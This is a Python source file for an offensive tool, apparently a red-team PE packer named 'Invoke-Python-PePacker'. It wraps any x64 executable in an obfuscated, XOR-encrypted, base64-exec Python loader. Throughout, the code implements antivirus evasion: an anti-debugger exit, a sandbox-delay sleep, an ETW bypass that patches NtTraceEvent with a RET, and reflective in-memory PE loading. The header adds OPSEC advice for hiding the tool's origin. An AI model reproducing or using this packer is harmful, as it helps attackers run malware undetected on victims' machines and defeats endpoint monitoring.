# =================================================================================================================================================================
# 'Invoke-Python-PePacker.py' is a PE packer python script that aims to bypass AV solutions such as Windows Defender.
# It generates an obfuscated and encrypted python script that embeds an offensive PE (x64 exe) and implements several antivirus bypass & defense evasion techniques.
# Author: https://github.com/JFR-C/ GNU General Public License v3.0
# =================================================================================================================================================================
# Features: 
# > Reflective PE injection using the 'PythonMemoryModule'
# > PE encryption (XOR) and compression (Zlib)
# > Script obfuscation (function and variable names are randomized + multiple encoding layer)
# > ETW bypass in user-mode (patching 'NtTraceEvent')
# > Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
# > Compatible with many offensive security tools (x64 EXE, unmanaged code, no GUI)
# OPSEC advice: remove all existing comments in this script before generating your obfuscated script
# =================================================================================================================================================================
# Usage (example):
# + C:\path\python-3.10.4> python.exe .\Invoke-Python-PePacker.py ".\PE.exe" ".\obfuscated_script.py"
# =================================================================================================================================================================

import sys
import os
import random
import string
import zlib
import base64

def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def format_pe(pe_bytes):
    return ', '.join(f'0x{b:02x}' for b in pe_bytes)

def random_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def file_to_base64(file_path):
    with open(file_path, 'rb') as file2:
        simply_base64_encoded = base64.b64encode(file2.read()).decode('utf-8')
        return simply_base64_encoded

def generate_loader(PE, key, output_path):
    # Compress PE before encryption
    compressed_pe = zlib.compress(PE)
    
    # Encrypt PE
    encrypted_pe = xor_encrypt(compressed_pe, key)

    # Randomized names
    decrypt_func = random_name()
    encrypted_var = random_name()
    key_var = random_name()
    compressed_var = random_name()
    pe_var = random_name()
    mem_size_var = random_name()
    killetw_func_var = random_name()
    pe_var = random_name()

    formatted_pe = format_pe(encrypted_pe)
    key_repr = ', '.join(f'0x{b:02x}' for b in key)


    loader_code = f"""import ctypes, zlib, time, logging, pythonmemorymodule, os, sys

# Basic sandbox detection and evasion - Terminates execution if a debugger is detected (basic anti-debugging check)
isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent()
if (isDebuggerPresent):
	sys.exit(1)

# Basic delayed execution (basic sandbox evasion)
time.sleep(6)

# ETW bypass (patching technique)
def {killetw_func_var}():
    PAGE_EXECUTE_READWRITE = 0x40
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    # Get address of NtTraceEvent
    try:
        nttraceevent = ntdll.NtTraceEvent
        nttraceevent_addr = ctypes.cast(nttraceevent, ctypes.c_void_p).value
    except AttributeError:
        return False
    # Prepare RET opcode
    ret_opcode = (ctypes.c_char * 1)(0xC3)
    old_protect = ctypes.c_ulong()
    # Change memory protection
    success = kernel32.VirtualProtect(
        ctypes.c_void_p(nttraceevent_addr),
        ctypes.c_size_t(1),
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )
    if not success:
        return False
    # Patch syscall with RET
    ctypes.memmove(nttraceevent_addr, ret_opcode, 1)
    return True

{killetw_func_var}()

def {decrypt_func}(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

{encrypted_var} = bytearray([{formatted_pe}])
{key_var} = bytearray([{key_repr}])

# PE decryption and decompression 
{compressed_var} = {decrypt_func}({encrypted_var}, {key_var})
{pe_var} = zlib.decompress({compressed_var})

# Redirect stdout to avoid the debugging messages printed out by the pythonmemorymodule
sys.stdout = open(os.devnull, 'w')

# Reflective PE loading using the pythonmemorymodule
pythonmemorymodule.MemoryModule(data={pe_var})
# pythonmemorymodule.MemoryModule(data={pe_var}, command =' -dumpname audit -obfuscate -pid 12076')
# pythonmemorymodule.MemoryModule(data={pe_var}, command =' coffee')

"""

    with open("Python-script.py", 'w') as f:
        f.write(loader_code)

    final_obfuscated_loader_script = """
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('<replace_base64_script>')[0]))
"""

    encoded_loader_script = file_to_base64("Python-script.py")
    os.remove("Python-script.py")
    template = final_obfuscated_loader_script
    template = template.replace("<replace_base64_script>", encoded_loader_script)

    with open(output_path, 'w') as out_file:
        out_file.write(template)

    print(f"Obfuscated python script written to: {output_path}")
    print(f"")

banner = """

Invoke-Python-PePacker v.1.0
.------..------..------..------..------..------..------..------..------..------.
|P.--. ||Y.--. ||P.--. ||E.--. ||P.--. ||A.--. ||C.--. ||K.--. ||E.--. ||R.--. |
| :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || (\/) || :(): |
| (__) || :\/: || :\/: || :\/: || (__) || :\/: || :\/: || (__) || :\/: || ()() |
| '--'P|| '--'Y|| '--'P|| '--'E|| '--'P|| '--'A|| '--'C|| '--'K|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'
"""

def main():
    print(banner[1:-1])
    if len(sys.argv) != 3:
        print("Usage: python.exe Invoke-Python-PePacker.py <PE.exe> <obfuscated_script.py>")
        print(f"")
        sys.exit(1)

    input_path = sys.argv[1]
    output_path = sys.argv[2]

    if not os.path.isfile(input_path):
        print(f"Error: File '{input_path}' not found.")
        sys.exit(1)

    with open(input_path, 'rb') as f:
        PE = f.read()

    # Edit the XOR key
    key = b'\xAA\xBB\xCC'  
    generate_loader(PE, key, output_path)


if __name__ == "__main__":
    main()
